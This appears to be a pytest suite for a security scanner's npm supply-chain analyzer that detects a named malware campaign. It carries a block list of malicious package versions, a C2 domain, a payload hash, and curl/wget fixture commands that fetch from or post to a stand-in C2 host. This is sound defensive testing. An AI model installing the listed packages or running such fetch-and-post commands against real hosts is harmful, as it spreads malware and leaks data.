"""Campaign samples are data: never invoke their package or network commands."""

import hashlib
import json

import pytest

from aurascan.analyzers import npm_supply_chain as campaign
from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.core.models import EvidenceQuality, Phase, Severity


EXACT = "SUPPLYCHAIN-NPM-SHAIHULUD-20260907"
DEEP_EXACT = "DEEPSTATIC-NPM-SHAIHULUD-20260907"
REVIEW = "SUPPLYCHAIN-NPM-SHAIHULUD-REVIEW-001"
DEEP_REVIEW = "DEEPSTATIC-NPM-SHAIHULUD-REVIEW-001"
COVERAGE = "NPM-METADATA-INSPECTION-INCOMPLETE-001"
COMMAND_COVERAGE = "SUPPLYCHAIN-NPM-INSPECTION-INCOMPLETE-001"
C2 = "SUPPLYCHAIN-NPM-SHAIHULUD-C2-001"
TUPLES = [
    ("feishu-docx-mcp", "0.3.2"), ("bmc-i18n-extract-cli", "1.1.1"),
    ("blueai-cli", "0.7.0"), ("bmc-translate-utils", "1.1.1"),
]


def shell(text, phase=Phase.pkgbuild_static):
    return campaign.analyze_npm_install_commands(text, "PKGBUILD", phase)


def metadata(data, path="package.json"):
    return campaign.inspect_npm_campaign_metadata(path, json.dumps(data))


@pytest.mark.parametrize("name,version", TUPLES)
@pytest.mark.parametrize("manager", ["npm install", "npm i", "bun add", "yarn add", "pnpm install"])
def test_exact_observed_install_tuple_blocks_without_any_execution(name, version, manager):
    result = shell("build() {\n  " + manager + " --registry=https://example.invalid " + name + "@" + version + "\n}")
    assert len(result) == 1
    finding = result[0]
    assert finding.rule_id == EXACT
    assert finding.severity == Severity.CRITICAL
    assert finding.blocks_installation and not finding.requires_manual_review
    assert finding.line_number == 2
    assert "no installation or execution was observed" in finding.explanation
    assert "GHSA-" in finding.evidence_snippet and "MAL-" in finding.evidence_snippet


@pytest.mark.parametrize("command", [
    "npm --registry=https://example.invalid install blueai-cli@0.7.0",
    "env NPM_TOKEN=fixture-secret npm install 'blueai-cli@0.7.0'",
    "command npm i --ignore-scripts blueai-cli@0.7.0",
    "exec /usr/bin/npm install -- blueai-cli@0.7.0",
    "npm install \\\n  blueai-cli@0.7.0 # an inert control fixture",
    "npm -w fixture-workspace install blueai-cli@0.7.0",
    "pnpm -w add blueai-cli@0.7.0",
    "pnpm add --link-workspace-packages blueai-cli@0.7.0",
    "npm i renamed@npm:blueai-cli@0.7.0",
    "npm i @fixture/renamed@npm:blueai-cli@0.7.0",
    "npm i npm:blueai-cli@0.7.0",
    "npm i blueai-cli@0.7.0 > fixture-log",
    "npm --registry --help install blueai-cli@0.7.0",
    "npm install --cache --version blueai-cli@0.7.0",
])
def test_supported_options_wrappers_aliases_and_continuations(command):
    result = shell(command)
    assert [f.rule_id for f in result] == [EXACT]
    assert "fixture-secret" not in json.dumps(result[0].to_dict())


@pytest.mark.parametrize("command", [
    "# npm install blueai-cli@0.7.0",
    'echo "npm install blueai-cli@0.7.0"',
    "printf '%s' 'npm install blueai-cli@0.7.0'",
    "message='npm install blueai-cli@0.7.0'",
    "cat <<'FIXTURE'\nnpm install blueai-cli@0.7.0\nFIXTURE\n",
    "source=('npm install blueai-cli@0.7.0')",
    "npm view blueai-cli@0.7.0",
    "npm --version", "npm --help install blueai-cli@0.7.0",
    "npm --unknown-option view ordinary",
    "npm install --registry blueai-cli@0.7.0 ordinary@1.0.0",
    "npm install --cache blueai-cli@0.7.0 ordinary@1.0.0",
    "npm install ordinary@1.0.0 > blueai-cli@0.7.0",
    "npm install ordinary@1.0.0 2>blueai-cli@0.7.0",
    "npm install blueai-cli@npm:ordinary@1.0.0",
    "npm install not-blueai-cli@0.7.0",
    "npm install @fixture/blueai-cli@0.7.0",
    "npm install https://example.invalid/blueai-cli@0.7.0",
    "npm install ./blueai-cli@0.7.0",
    "npm install ./local-safe # blueai-cli@0.7.0",
    "npm ci", "bun run index.js",
])
def test_messages_option_values_and_unrelated_packages_do_not_claim_selection(command):
    assert shell(command) == []


@pytest.mark.parametrize("version", ["", "@latest", "@^0.7.0", "@~0.7.0", "@0.6.0", "@$fixture_version"])
def test_broad_advisory_and_ambiguous_selection_require_review_without_exact_payload_claim(version):
    result = shell("npm install blueai-cli" + version)
    assert [f.rule_id for f in result] == [REVIEW]
    assert result[0].severity == Severity.HIGH
    assert result[0].requires_manual_review and not result[0].blocks_installation
    assert "Other versions are not assumed safe" in result[0].explanation
    assert "fixture_version" not in json.dumps(result[0].to_dict())


@pytest.mark.parametrize("phase,expected", [
    (Phase.pkgbuild_static, EXACT), (Phase.install_hook_static, EXACT),
    (Phase.unpacked_source_scan, DEEP_EXACT),
])
def test_caller_selected_shell_phase_is_preserved(phase, expected):
    finding = shell("npm install blueai-cli@0.7.0", phase)[0]
    assert finding.phase == phase and finding.rule_id == expected


def test_deterministic_caller_preserves_outer_package_identity_and_phase():
    findings = DeterministicAnalyzer().analyze_content(
        "fixture.install", "npm install blueai-cli@0.7.0", Phase.install_hook_static,
        "outer-package", "1.0",
    )
    finding = next(f for f in findings if f.rule_id == EXACT)
    assert finding.package_name == "outer-package" and finding.package_version == "1.0"
    assert finding.phase == Phase.install_hook_static
    assert not any(f.rule_id == EXACT for f in DeterministicAnalyzer().analyze_content(
        "fixture.js", "npm install blueai-cli@0.7.0", Phase.unpacked_source_scan,
    ))


@pytest.mark.parametrize("text", [
    "npm install --unknown-option blueai-cli@0.7.0",
    "npm install --registry",
    "npm install 'unterminated",
    "npm install " + "npm:" * 2000 + "blueai-cli@0.7.0",
    "npm install " + "x" * (campaign.MAX_SCALAR + 1),
])
def test_unsupported_shell_boundaries_fail_closed_without_false_confirmation(text):
    result = shell(text)
    assert result and all(f.rule_id == COMMAND_COVERAGE for f in result)
    assert all(f.blocks_installation and f.severity == Severity.HIGH for f in result)


def test_shell_total_input_bound_is_enforced():
    result = shell(" " * (5 * 1024 * 1024 + 1))
    assert result[0].rule_id == COMMAND_COVERAGE and result[0].blocks_installation


@pytest.mark.parametrize("text", [
    'dependency=blueai-cli@0.7.0\nnpm install "$dependency"',
    'npm install "$dependency"\ndependency=blueai-cli@0.7.0',
    "dependency=blueai-cli@0.7.0\nnpm install '$dependency'",
])
def test_indirect_selectors_preserve_coverage_without_erasing_quote_or_order_semantics(text):
    result = shell(text)
    assert [f.rule_id for f in result] == [COMMAND_COVERAGE]
    assert result[0].blocks_installation


@pytest.mark.parametrize("name,version", TUPLES)
def test_exact_manifest_identity_and_dependency_fields(name, version):
    assert metadata({"name": name, "version": version})[0].rule_id == DEEP_EXACT
    for field in ("dependencies", "devDependencies", "optionalDependencies", "peerDependencies"):
        assert metadata({field: {name: version}})[0].rule_id == DEEP_EXACT


def test_structured_metadata_does_not_scan_arbitrary_strings_or_promote_alias_name():
    assert metadata({
        "name": "ordinary", "version": "1.0.0",
        "description": "npm install blueai-cli@0.7.0",
        "scripts": {"test": "npm install blueai-cli@0.7.0"},
        "dependencies": {"blueai-cli": "npm:ordinary@1.0.0"},
    }) == []
    result = metadata({"dependencies": {"fixture-alias": "npm:blueai-cli@0.7.0"}})
    assert [f.rule_id for f in result] == [DEEP_EXACT]


def test_encoded_json_identity_is_decoded_before_matching():
    result = campaign.inspect_npm_campaign_metadata(
        "package.json", '{"dependencies":{"blueai\\u002dcli":"0.7.0"}}',
    )
    assert result[0].rule_id == DEEP_EXACT


@pytest.mark.parametrize("selector", ["latest", "^0.7.0", "0.6.0", "file:../fixture", "workspace:*"])
def test_metadata_broad_advisory_selection_does_not_claim_identical_payload(selector):
    result = metadata({"dependencies": {"blueai-cli": selector}})
    assert [f.rule_id for f in result] == [DEEP_REVIEW]
    assert result[0].requires_manual_review and not result[0].blocks_installation


@pytest.mark.parametrize("version", [2, 3])
def test_modern_lockfile_actual_names_nested_dependencies_and_aliases(version):
    result = metadata({"lockfileVersion": version, "packages": {
        "": {"name": "ordinary", "version": "1.0.0"},
        "node_modules/fixture/node_modules/blueai-cli": {"version": "0.7.0"},
        "node_modules/fixture-alias": {"name": "feishu-docx-mcp", "version": "0.3.2"},
        "node_modules/blueai-cli": {"name": "ordinary", "version": "0.7.0"},
    }}, "package-lock.json")
    assert len(result) == 2
    assert all(f.rule_id == DEEP_EXACT for f in result)


def test_modern_lockfile_scoped_packages_and_workspaces_do_not_infer_bare_names():
    assert metadata({"lockfileVersion": 3, "packages": {
        "node_modules/@fixture/blueai-cli": {"version": "0.7.0"},
        "packages/blueai-cli": {"version": "0.7.0"},
    }}, "package-lock.json") == []


def test_legacy_lockfile_nested_version_aliases_and_duplicate_records():
    result = metadata({"lockfileVersion": 1, "dependencies": {
        "ordinary": {"version": "1.0.0", "dependencies": {
            "fixture-alias": {"version": "npm:blueai-cli@0.7.0"},
            "blueai-cli": {"version": "0.7.0"},
        }},
    }}, "npm-shrinkwrap.json")
    assert [f.rule_id for f in result] == [DEEP_EXACT]


@pytest.mark.parametrize("path,data", [
    ("package.json", {"dependencies": []}),
    ("package.json", {"dependencies": {"blueai-cli": []}}),
    ("package.json", {"name": [], "version": "0.7.0"}),
    ("package.json", {"name": "blueai-cli", "version": False}),
    ("package.json", {"name": "ordinary", "version": "npm:blueai-cli@0.7.0"}),
    ("package.json", {"name": "blueai-cli", "version": "npm:ordinary@1.0.0"}),
    ("package.json", {"dependencies": {"a": "npm:" * 1000 + "blueai-cli@0.7.0"}}),
    ("package.json", {"dependencies": {"a": "npm:npm:blueai-cli@0.7.0"}}),
    ("package-lock.json", {"lockfileVersion": 4}),
    ("package-lock.json", {"lockfileVersion": True}),
    ("package-lock.json", {"lockfileVersion": 3}),
    ("package-lock.json", {"lockfileVersion": 3, "packages": []}),
    ("package-lock.json", {"lockfileVersion": 3, "packages": {"node_modules/blueai-cli": []}}),
    ("package-lock.json", {"lockfileVersion": 3, "packages": {"node_modules/../blueai-cli": {}}}),
    ("package-lock.json", {"lockfileVersion": 1, "dependencies": {"blueai-cli": "0.7.0"}}),
])
def test_malformed_metadata_fails_closed_as_coverage(path, data):
    result = metadata(data, path)
    assert [f.rule_id for f in result] == [COVERAGE]
    assert result[0].blocks_installation and result[0].severity == Severity.HIGH


@pytest.mark.parametrize("text", [
    '{"dependencies":{"blueai-cli":"0.7.0", "blueai-cli":"fixture-secret"}}',
    '{"dependencies":{"blueai-cli":NaN}}', "[]", "{",
])
def test_strict_json_refuses_duplicate_non_json_and_malformed_values(text):
    result = campaign.inspect_npm_campaign_metadata("package.json", text)
    assert result[0].rule_id == COVERAGE
    assert "fixture-secret" not in json.dumps(result[0].to_dict())


def test_metadata_structure_and_scalar_bounds(monkeypatch):
    monkeypatch.setattr(campaign, "MAX_NODES", 4)
    assert metadata({"ordinary": [1, 2, 3, 4]})[0].rule_id == COVERAGE
    monkeypatch.setattr(campaign, "MAX_NODES", 30000)
    assert metadata({"description": "x" * (campaign.MAX_SCALAR + 1)})[0].rule_id == COVERAGE
    data = {}
    for _ in range(campaign.MAX_DEPTH + 1):
        data = {"child": data}
    assert metadata(data)[0].rule_id == COVERAGE


def test_non_metadata_filename_is_ignored():
    assert metadata({"name": "blueai-cli", "version": "0.7.0"}, "README.md") == []


def test_captured_bytes_hash_only_and_no_checksum_mention_matches(monkeypatch):
    payload = b"inert fixture bytes: no executable payload\n"
    digest = hashlib.sha256(payload).hexdigest()
    assert campaign.known_payload_findings("index.js", payload) == []
    for known in campaign.KNOWN_PAYLOAD_SHA256:
        assert campaign.known_payload_findings("checksums.txt", known.encode("ascii")) == []
    monkeypatch.setattr(campaign, "KNOWN_PAYLOAD_SHA256", frozenset({digest}))
    result = campaign.known_payload_findings("renamed.data", payload)
    assert result[0].rule_id == "DEEPSTATIC-NPM-SHAIHULUD-PAYLOAD-001"
    assert result[0].evidence_quality == EvidenceQuality.confirmed_signature
    assert result[0].file_hash == digest
    assert result[0].blocks_installation
    assert campaign.known_payload_digest_findings("renamed.data", digest)[0].file_hash == digest
    assert campaign.known_payload_findings("index.js", payload + b"changed") == []


def test_production_intelligence_preserves_known_payload_and_verified_sources():
    assert "e37e3ddeeaaa9e0c4fdbcb829b4895a6521031c80053fc436625b61e6ee5b1a6" in campaign.KNOWN_PAYLOAD_SHA256
    assert set(campaign.MALICIOUS_PACKAGES) == {name for name, _version in TUPLES}
    assert "t.m-kosche.com" in campaign.malicious_domains()


@pytest.mark.parametrize("value,expected", [
    ("https://t.m-kosche.com/path", True), ("t.m-kosche.com", True),
    ("https://T.M-KOSCHE.COM.:443/path", True),
    ("https://t.m-kosche.com.example.invalid/path", False),
    ("https://example.invalid/t.m-kosche.com", False),
    ("https://t.m-kosche.com@example.invalid/path", False),
    ("https://example.invalid/?next=https://t.m-kosche.com", False),
    ("https://t.m-kosche.com:invalid/path", False),
    ("https://t.m-kosche.com../path", False),
    ("https://t.m-kosche.com\\@example.invalid/path", False),
    ("https://t.m-kosche.com\n", False),
])
def test_production_domain_matching_is_a_local_hostname_comparison(value, expected):
    assert campaign.known_malicious_npm_host(value) is expected


@pytest.mark.parametrize("command", [
    "curl -fsSL https://c2.example.invalid/path",
    "curl --url=https://c2.example.invalid/path --output fixture.out",
    "curl -X POST -H 'Authorization: fixture-secret' --url https://c2.example.invalid/path",
    "curl -sSofixture.out https://c2.example.invalid/path",
    "curl --data --help https://c2.example.invalid/path",
    "curl --user-agent --version https://c2.example.invalid/path",
    "wget -qO fixture.out https://c2.example.invalid/path",
    "wget --output-document=fixture.out https://c2.example.invalid/path",
    "wget --post-data --help https://c2.example.invalid/path",
])
def test_active_destination_correlation_uses_injected_reserved_domain(monkeypatch, command):
    monkeypatch.setattr(campaign, "_MALICIOUS_DOMAINS", ("c2.example.invalid",))
    result = shell(command)
    assert [f.rule_id for f in result] == [C2]
    assert result[0].blocks_installation
    assert "fixture-secret" not in json.dumps(result[0].to_dict())
    assert shell(command, Phase.unpacked_source_scan)[0].rule_id == "DEEPSTATIC-NPM-SHAIHULUD-C2-001"


@pytest.mark.parametrize("command", [
    "# curl https://c2.example.invalid/path",
    'echo "curl https://c2.example.invalid/path"',
    "curl --output https://c2.example.invalid/path https://example.invalid",
    "curl -ohttps://c2.example.invalid/path https://example.invalid",
    "curl --data https://c2.example.invalid/path https://example.invalid",
    "curl --header https://c2.example.invalid/path https://example.invalid",
    "curl --user https://c2.example.invalid/path https://example.invalid",
    "curl https://example.invalid/https://c2.example.invalid/path",
    "curl https://c2.example.invalid.other.example.invalid/path",
    "curl https://c2.example.invalid@example.invalid/path",
    "curl --help https://c2.example.invalid/path",
    "wget --input-file https://c2.example.invalid/path https://example.invalid",
    "wget --output-document https://c2.example.invalid/path https://example.invalid",
    "wget -Ohttps://c2.example.invalid/path https://example.invalid",
    "wget --post-data https://c2.example.invalid/path https://example.invalid",
    "wget --execute https://c2.example.invalid/path https://example.invalid",
    "wget --help https://c2.example.invalid/path",
])
def test_network_option_values_messages_and_lookalikes_are_not_destinations(monkeypatch, command):
    monkeypatch.setattr(campaign, "_MALICIOUS_DOMAINS", ("c2.example.invalid",))
    assert shell(command) == []


def test_unknown_network_option_preserves_coverage_without_claiming_destination(monkeypatch):
    monkeypatch.setattr(campaign, "_MALICIOUS_DOMAINS", ("c2.example.invalid",))
    result = shell("curl --unknown-option https://c2.example.invalid/path")
    assert [f.rule_id for f in result] == [COMMAND_COVERAGE]
    assert result[0].blocks_installation and result[0].severity == Severity.HIGH
